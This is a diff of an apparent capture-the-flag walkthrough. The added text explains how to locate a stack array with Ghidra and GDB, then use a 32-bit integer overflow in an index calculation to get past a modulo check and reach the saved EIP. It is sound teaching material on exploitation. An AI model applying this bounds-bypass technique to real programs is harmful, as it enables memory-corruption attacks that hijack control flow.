@@ -59,7 +59,16 @@ Saved registers:
  eip at 0xffffcf2c
 ```
 
-Find the data array start (0x1bc = 444 bytes):
+**Find where the data array starts:**
+
+In Ghidra, look at the `main()` function's local variables. You'll see:
+```c
+undefined4 local_1bc [100];  // This is the data array
+```
+
+The `_1bc` tells you it's at **EBP - 0x1bc** (0x1bc = 444 bytes below base pointer).
+
+Now in GDB, calculate the actual address (0x1bc = 444 bytes):
 ```bash
 (gdb) p/x $ebp - 0x1bc
 $1 = 0xffffcd6c
@@ -80,12 +89,17 @@ The saved EIP is at **index 114**.
 
 **Solution:** Use 32-bit integer overflow
 
+In 32-bit systems, multiplying large numbers wraps around at 2^32 (4,294,967,296).
+
 When calculating byte offset: `index × 4`
 
 If we use index `1073741938`:
 ```
-1073741938 × 4 = 4294967752
-4294967752 mod 2^32 = 456
+1073741938 × 4 = 4,294,967,752
+
+This exceeds 2^32, so it wraps:
+  4,294,967,752 - 4,294,967,296 = 456 bytes ✅
+
 456 / 4 = 114 (our target index!)
 
 But: 1073741938 % 3 = 1 (bypasses the check!)
